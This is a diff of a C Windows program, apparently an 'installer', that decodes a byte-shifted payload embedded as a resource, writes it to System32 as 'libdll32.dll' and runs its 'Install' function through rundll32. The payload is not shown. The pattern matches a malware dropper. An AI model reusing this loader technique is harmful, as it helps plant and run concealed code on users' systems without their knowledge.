@@ -1,7 +1,13 @@
-#include "installer.h"
+#include <stdio.h>
+#include <khopanwin32.h>
+#include <khopanstring.h>
 #include "resource.h"
 
-#define DLL_NAME L"libdll32.dll"
+#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")
+
+#define SYSTEM32     L"System32"
+#define DLL_NAME     L"libdll32.dll"
+#define RUNDLL32EXE  L"rundll32.exe"
 #define DLL_FUNCTION L"Install"
 
 int main(int argc, char** argv) {
@@ -9,14 +15,14 @@ int main(int argc, char** argv) {
 	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 
 	if(!resourceHandle) {
-		consoleError(GetLastError(), L"FindResourceW");
+		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
 		return 1;
 	}
 
 	DWORD resourceSize = SizeofResource(NULL, resourceHandle);
 
 	if(!resourceSize) {
-		consoleError(GetLastError(), L"SizeofResource");
+		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
 		return 1;
 	}
 
@@ -24,21 +30,21 @@ int main(int argc, char** argv) {
 	HGLOBAL resource = LoadResource(NULL, resourceHandle);
 
 	if(!resource) {
-		consoleError(GetLastError(), L"LoadResource");
+		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
 		return 1;
 	}
 
 	BYTE* data = LockResource(resource);
 
 	if(!data) {
-		consoleError(GetLastError(), L"LockResource");
+		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
 		return 1;
 	}
 
-	BYTE* buffer = malloc(resourceSize);
+	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);
 
 	if(!buffer) {
-		consoleError(GetLastError(), L"malloc");
+		KHWin32ConsoleErrorW(ERROR_OUTOFMEMORY, L"malloc");
 		return 1;
 	}
 
@@ -48,91 +54,118 @@ int main(int argc, char** argv) {
 		buffer[i] = (data[i] - 18) % 0xFF;
 	}
 
-	wchar_t* system32 = getSystem32Directory();
-	printf("System32: %ws\n", system32);
-	wchar_t* dllFile = mergePath(system32, DLL_NAME);
-	printf("DLL: %ws\nCreate file\n", dllFile);
-	HANDLE file = CreateFileW(dllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	free(dllFile);
+	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();
+
+	if(!windowsDirectoryPath) {
+		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
+		FREE(buffer);
+		return 1;
+	}
+
+	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
+	FREE(windowsDirectoryPath);
+
+	if(!system32Path) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(buffer);
+		return 1;
+	}
+
+	wprintf(SYSTEM32 L": %ws\n", system32Path);
+	LPWSTR libdll32Path = KHFormatMessageW(L"%ws\\" DLL_NAME, system32Path);
+
+	if(!libdll32Path) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(system32Path);
+		FREE(buffer);
+		return 1;
+	}
+
+	printf("DLL: %ws\nCreate file\n", libdll32Path);
+	HANDLE file = CreateFileW(libdll32Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	FREE(libdll32Path);
 
 	if(file == INVALID_HANDLE_VALUE) {
-		free(buffer);
-		consoleError(GetLastError(), L"CreateFileW");
+		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
+		FREE(system32Path);
+		FREE(buffer);
 		return 1;
 	}
 
 	DWORD written = 0;
+	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
+	FREE(buffer);
 	
-	if(!WriteFile(file, buffer, resourceSize, &written, NULL)) {
-		free(buffer);
-		consoleError(GetLastError(), L"WriteFile");
+	if(!result) {
+		KHWin32DialogErrorW(GetLastError(), L"WriteFile");
+		FREE(system32Path);
 		return 1;
 	}
 
-	free(buffer);
 	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
 
+	if(resourceSize != written) {
+		printf("Error: Resource size mismatch\n");
+		FREE(system32Path);
+		return 1;
+	}
+
 	if(!CloseHandle(file)) {
-		consoleError(GetLastError(), L"CloseHandle");
+		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
+		FREE(system32Path);
 		return 1;
 	}
 
 	printf("File closed\n");
-	wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
-	free(system32);
-	size_t pathLength = wcslen(rundll32File);
-	size_t nameLength = wcslen(DLL_NAME);
-	size_t functionLength = wcslen(DLL_FUNCTION);
-	size_t argumentBufferLength = pathLength + 1 + nameLength + 1 + functionLength + 1;
-	wchar_t* argumentBuffer = malloc(argumentBufferLength * sizeof(wchar_t));
+	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);
+	FREE(system32Path);
 
-	if(!argumentBuffer) {
-		consoleError(ERROR_OUTOFMEMORY, L"malloc");
+	if(!rundll32Path) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		return 1;
 	}
 
-	for(size_t i = 0; i < pathLength; i++) {
-		argumentBuffer[i] = rundll32File[i];
+	LPWSTR rundll32Argument = KHFormatMessageW(L"%ws " DLL_NAME L"," DLL_FUNCTION, rundll32Path);
+
+	if(!rundll32Argument) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(rundll32Path);
+		return 1;
 	}
 
-	argumentBuffer[pathLength] = L' ';
-
-	for(size_t i = 0; i < nameLength; i++) {
-		argumentBuffer[i + pathLength + 1] = DLL_NAME[i];
-	}
-
-	argumentBuffer[pathLength + nameLength + 1] = L',';
-
-	for(size_t i = 0; i < functionLength; i++) {
-		argumentBuffer[i + pathLength + nameLength + 2] = DLL_FUNCTION[i];
-	}
-
-	argumentBuffer[argumentBufferLength - 1] = 0;
 	STARTUPINFO startupInformation = {0};
-	startupInformation.cb = sizeof(STARTUPINFO);
-	PROCESS_INFORMATION processInformation = {0};
+	startupInformation.cb = sizeof(startupInformation);
+	PROCESS_INFORMATION processInformation;
 	printf("Running DLL File\n");
+	result = CreateProcessW(rundll32Path, rundll32Argument, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
+	FREE(rundll32Argument);
+	FREE(rundll32Path);
 
-	if(!CreateProcessW(rundll32File, argumentBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation)) {
-		free(rundll32File);
-		free(argumentBuffer);
-		consoleError(GetLastError(), L"CreateProcessW");
+	if(!result) {
+		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
 		return 1;
 	}
 
-	free(rundll32File);
-	free(argumentBuffer);
+	int returnValue = 1;
+
+	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
+		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
+		goto closeHandles;
+	}
+
+	returnValue = 0;
+closeHandles:
 	printf("Closing Handles\n");
 
 	if(!CloseHandle(processInformation.hProcess)) {
-		consoleError(GetLastError(), L"CloseHandle");
+		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
 		return 1;
 	}
 
 	if(!CloseHandle(processInformation.hThread)) {
-		consoleError(GetLastError(), L"CloseHandle");
+		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
 		return 1;
 	}
 
-	return 0;
+	return returnValue;
 }
